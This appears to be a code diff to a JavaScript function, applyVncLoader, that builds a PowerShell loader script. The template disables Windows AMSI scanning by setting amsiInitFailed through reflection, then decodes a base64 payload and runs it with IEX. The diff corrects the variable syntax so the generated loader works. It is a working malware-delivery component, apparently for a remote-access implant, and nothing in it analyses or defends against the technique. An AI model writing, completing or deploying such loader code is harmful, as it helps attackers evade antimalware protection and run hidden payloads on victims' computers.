@@ -1330,14 +1330,14 @@ function applyVncLoader(payload) {
 
   return `
 # --- AMSI Bypass ---
-${vAmsiRef}=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-${vAmsiField}=${vAmsiRef}.GetField('amsiInitFailed','NonPublic,Static')
-${vAmsiSet}=${vAmsiField}.SetValue($null,$true)
+$${vAmsiRef} = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$${vAmsiField} = $${vAmsiRef}.GetField('amsiInitFailed','NonPublic,Static')
+$${vAmsiSet} = $${vAmsiField}.SetValue($null,$true)
 
 # --- Decode and execute payload ---
-${vEnc}=[System.Text.Encoding]::Unicode
-${vDecoded}=${vEnc}.GetString([Convert]::FromBase64String('${vB64}'))
-IEX ${vDecoded}
+$${vEnc} = [System.Text.Encoding]::Unicode
+$${vDecoded} = $${vEnc}.GetString([Convert]::FromBase64String('${vB64}'))
+IEX $${vDecoded}
   `.trim();
 }
 
